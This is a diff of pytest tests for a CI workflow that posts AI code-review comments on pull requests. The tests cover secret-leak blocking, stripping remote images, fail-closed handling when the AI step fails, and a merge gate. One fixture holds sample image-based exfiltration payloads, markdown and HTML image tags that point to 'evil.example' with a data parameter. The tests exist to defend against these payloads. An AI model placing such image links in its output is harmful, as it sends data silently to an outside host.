@@ -365,7 +365,102 @@ def test_leak_check_runs_before_posting():
     # 只有這兩個 step 會把 review-output.md 相關內容貼成留言
     posting = [s.get("name") for s in doc["jobs"]["review"]["steps"]
                if "review-output.md" in (s.get("run") or "") and "gh pr comment" in (s.get("run") or "")]
-    assert set(posting) <= {LEAK_STEP, VERDICT_STEP}, posting
+    assert set(posting) <= {LEAK_STEP, VERDICT_STEP, FAILCLOSED_STEP}, posting
+
+
+def test_leak_check_blocks_jwt_shape(tmp_path):
+    jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.c2lnbmF0dXJl"
+    res = _leak_check(tmp_path, f"結論 {jwt}\nNEEDS_WORK: no\n", {})
+    assert res.returncode != 0
+    assert jwt not in res.stdout + res.stderr
+
+
+# ------------------------------------------------------- 外部圖片移除
+
+IMG_PLACEHOLDER = "[已移除外部圖片]"
+
+
+def _posted_comment(tmp_path: Path, body: str) -> str:
+    (tmp_path / "review-output.md").write_text(body + "\nNEEDS_WORK: no\n", encoding="utf-8")
+    res = _run(_step_script(VERDICT_STEP), tmp_path, _fake_gh(tmp_path), {})
+    assert res.returncode == 0, res.stderr
+    assert "pr comment 1 --body-file comment.md" in _calls(tmp_path)
+    return (tmp_path / "comment.md").read_text(encoding="utf-8")
+
+
+def test_remote_images_are_neutralized(tmp_path):
+    body = (
+        "看這張 ![x](https://evil.example/?d=AAAA) 圖\n"
+        '<img src="https://evil.example/x">\n'
+        '<IMG\n  src="https://evil.example/multiline">\n'
+        "![ref][r]\n\n[r]: https://evil.example/ref\n"
+        "<picture><source srcset=\"https://evil.example/s\"></picture>\n"
+        "一般連結 [link](https://example.com) 要保留\n"
+    )
+    out = _posted_comment(tmp_path, body)
+    assert out.count(IMG_PLACEHOLDER) >= 5, out
+    assert "![" not in out.replace("!\\[", "")
+    assert "<img" not in out.lower() and "<source" not in out.lower()
+    for bad in ("](https://evil.example/?d=AAAA)", 'src="https://evil.example/x"'):
+        assert bad not in out, out
+    assert "[link](https://example.com)" in out, "一般連結不會被自動抓取，必須保留"
+
+
+def test_clean_comment_unchanged(tmp_path):
+    body = "## 這個 PR 做了什麼\n改了 `a < b` 的判斷，見 [文件](https://example.com/doc)。\n\n- 項目一\n"
+    out = _posted_comment(tmp_path, body)
+    assert out == body + "\n" or out == body, repr(out)
+
+
+# ------------------------------------------------------- Claude 失敗時 fail closed
+
+FAILCLOSED_STEP = "Claude 步驟失敗時 fail closed"
+GATE_STEP = "閘門判定"
+
+
+def test_failclosed_labels_comments_and_removes_output(tmp_path):
+    (tmp_path / "review-output.md").write_text("半成品\n", encoding="utf-8")
+    (tmp_path / "comment.md").write_text("舊留言\n", encoding="utf-8")
+    res = _run(_step_script(FAILCLOSED_STEP), tmp_path, _fake_gh(tmp_path), {})
+    assert res.returncode == 0, res.stderr
+    calls = _calls(tmp_path)
+    assert "pr edit 1 --add-label needs-work" in calls
+    assert "pr comment 1 --body-file review-failed.md" in calls
+    assert "不是對程式碼的判定" in (tmp_path / "review-failed.md").read_text(encoding="utf-8")
+    assert not (tmp_path / "review-output.md").exists()
+    assert not (tmp_path / "comment.md").exists()
+
+
+def test_failclosed_runs_only_when_claude_step_failed():
+    doc = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
+    steps = doc["jobs"]["review"]["steps"]
+    names = [s.get("name") for s in steps]
+    claude = next(s for s in steps if s.get("uses", "").startswith("anthropics/claude-code-action"))
+    assert claude.get("id") == "claude"
+    fc = next(s for s in steps if s.get("name") == FAILCLOSED_STEP)
+    assert "failure()" in fc["if"] and "steps.claude.outcome == 'failure'" in fc["if"]
+    assert names.index(FAILCLOSED_STEP) < names.index(GATE_STEP)
+
+
+def _gate(tmp_path: Path, gh_body: str):
+    bindir = tmp_path / "bin"
+    bindir.mkdir()
+    (bindir / "gh").write_text("#!/usr/bin/env bash\n" + gh_body + "\n", encoding="utf-8", newline="\n")
+    (bindir / "gh").chmod(0o755)
+    return _run(_step_script(GATE_STEP), tmp_path, bindir, {})
+
+
+@pytest.mark.parametrize(
+    "gh_body, blocked, why",
+    [
+        ("printf 'bug\\nneeds-work\\n'", True, "有 needs-work → 紅燈"),
+        ("printf 'bug\\n'", False, "沒有 needs-work → 綠燈"),
+        ("echo 'HTTP 502' >&2; exit 1", True, "gh pr view 失敗不能放行"),
+    ],
+)
+def test_gate(tmp_path, gh_body, blocked, why):
+    res = _gate(tmp_path, gh_body)
+    assert (res.returncode != 0) is blocked, f"{why}: {res.stdout} {res.stderr}"
 
 
 # ------------------------------------------------------- 靜態安全不變式
